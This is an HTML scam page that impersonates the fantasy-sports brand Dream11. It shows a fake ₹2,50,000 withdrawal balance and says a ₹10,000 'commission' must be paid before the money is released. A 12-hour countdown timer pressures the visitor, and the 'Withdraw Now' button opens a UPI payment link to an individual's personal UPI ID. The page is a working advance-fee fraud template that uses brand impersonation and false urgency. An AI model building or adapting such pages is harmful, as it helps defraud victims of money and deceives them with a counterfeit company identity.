<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdrawal Page</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #d8232a;
      color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      background: white;
      border-radius: 20px;
      padding: 30px 20px;
      text-align: center;
      max-width: 320px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }

    .logo {
      font-size: 30px;
      color: red;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .heading {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 15px;
    }

    .amount {
      font-size: 32px;
      color: green;
      margin: 10px 0;
    }

    .note {
      font-size: 14px;
      margin-bottom: 15px;
    }

    .countdown {
      font-size: 18px;
      color: red;
      margin-bottom: 20px;
    }

    .btn {
      padding: 12px 25px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    .expired {
      color: gray;
      font-size: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container" id="mainContent">
    <div class="logo">D</div>
    <div class="logo" style="font-size: 18px;">DREAM11</div>
    <div class="heading">Withdrawal Page</div>
    <p>Your withdrawal amount is:</p>
    <div class="amount">₹2,50,000</div>
    <div class="note">You must pay ₹10,000 commission to proceed with withdrawal.</div>
    <div class="countdown" id="timer">Time left: --:--:--</div>
    <button class="btn" onclick="withdraw()">Withdraw Now</button>
  </div>

  <div class="container" id="expiredContent" style="display:none;">
    <div class="expired">Link Expired</div>
  </div>

  <audio id="celebrationAudio" autoplay>
    <source src="12celebrate.mp3" type="audio/mp3" />
  </audio>

  <script>
    function withdraw() {
      window.location.href = "upi://pay?pa=ramchoudhary2315@ybl&pn=Ram&cu=INR";
    }

    const countdownEl = document.getElementById("timer");
    const mainContent = document.getElementById("mainContent");
    const expiredContent = document.getElementById("expiredContent");

    const savedTime = localStorage.getItem("withdrawalStart");
    const startTime = savedTime ? new Date(savedTime) : new Date();
    if (!savedTime) {
      localStorage.setItem("withdrawalStart", startTime);
    }

    const expireTime = new Date(startTime.getTime() + 12 * 60 * 60 * 1000);

    function updateCountdown() {
      const now = new Date();
      const diff = expireTime - now;

      if (diff <= 0) {
        mainContent.style.display = "none";
        expiredContent.style.display = "block";
        return;
      }

      const hours = Math.floor(diff / (1000 * 60 * 60));
      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((diff % (1000 * 60)) / 1000);

      countdownEl.textContent = `Time left: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    }

    setInterval(updateCountdown, 1000);
    updateCountdown();
  </script>
</body>
</html>
